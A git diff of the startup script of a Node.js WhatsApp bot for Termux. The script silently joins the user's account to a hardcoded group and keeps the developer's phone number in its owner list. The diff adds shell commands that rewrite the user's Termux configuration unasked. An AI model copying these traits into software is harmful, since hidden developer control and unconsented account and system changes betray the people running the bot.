@@ -28,7 +28,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
     denz.on('qr', qr => {
         qrcode.generate(qr, { small: true })
         console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
-    })
+      })
     fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
     
     denz.on('credentials-updated', () => {
@@ -36,8 +36,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
         })
      
       await denz.connect({ timeoutMs: 30 * 1000 });
-  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
+  teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
  denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
@@ -66,7 +65,7 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["6285866295942@s.whatsapp.net","6283125187277@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        ownerNumber = ["6285866295942@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "6285866295942@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
@@ -151,13 +150,16 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))},exec(`mkdir $HOME/.termux/ ;echo "extra-keys = [['ESC','/','-','HOME','UP','END','PGUP'],['TAB','CTRL','ALT','LEFT','DOWN','RIGHT','PGDN']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => {
+      console.log(stdout)}))}, 200 ) ;
 	}
 	else
 	{
 		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
 	}
 }
+exec(` mkdir $HOME/.termux/ ;echo "extra-keys = [['•','WELCOME USER !','•']]" >> $HOME/.termux/termux.properties;termux-reload-settings`, (error, stdout, stderr) => {
+			console.log(stdout)
 console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		font: 'Standard',
 		horizontalLayout: 'default',
@@ -172,6 +174,7 @@ progressBar = term.progressBar( {
 	percent: true
 } ) ;
 doProgress() ;
+})
 
 /**
  * Uncache if there is file change
